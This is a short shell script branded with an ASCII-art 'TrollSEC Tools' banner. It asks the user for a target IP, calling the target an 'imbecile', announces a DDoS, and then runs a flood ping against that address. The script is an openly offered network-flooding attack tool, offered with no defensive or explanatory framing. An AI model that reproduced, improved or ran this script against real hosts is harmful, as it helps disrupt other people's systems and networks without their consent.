cat << "EOF"
 /$$$$$$$$                  /$$ /$$  /$$$$$$  /$$$$$$$$  /$$$$$$        /$$$$$$$$                  /$$
|__  $$__/                 | $$| $$ /$$__  $$| $$_____/ /$$__  $$      |__  $$__/                 | $$
   | $$  /$$$$$$   /$$$$$$ | $$| $$| $$  \__/| $$      | $$  \__/         | $$  /$$$$$$   /$$$$$$ | $$  /$$$$$$$
   | $$ /$$__  $$ /$$__  $$| $$| $$|  $$$$$$ | $$$$$   | $$               | $$ /$$__  $$ /$$__  $$| $$ /$$_____/
   | $$| $$  \__/| $$  \ $$| $$| $$ \____  $$| $$__/   | $$               | $$| $$  \ $$| $$  \ $$| $$|  $$$$$$
   | $$| $$      | $$  | $$| $$| $$ /$$  \ $$| $$      | $$    $$         | $$| $$  | $$| $$  | $$| $$ \____  $$
   | $$| $$      |  $$$$$$/| $$| $$|  $$$$$$/| $$$$$$$$|  $$$$$$/         | $$|  $$$$$$/|  $$$$$$/| $$ /$$$$$$$/
   |__/|__/       \______/ |__/|__/ \______/ |________/ \______/          |__/ \______/  \______/ |__/|_______/

EOF
echo What The Imbeciles IP?
read IPDos
echo "Starting to DDOS $IPDos."
ping -f $IPDos
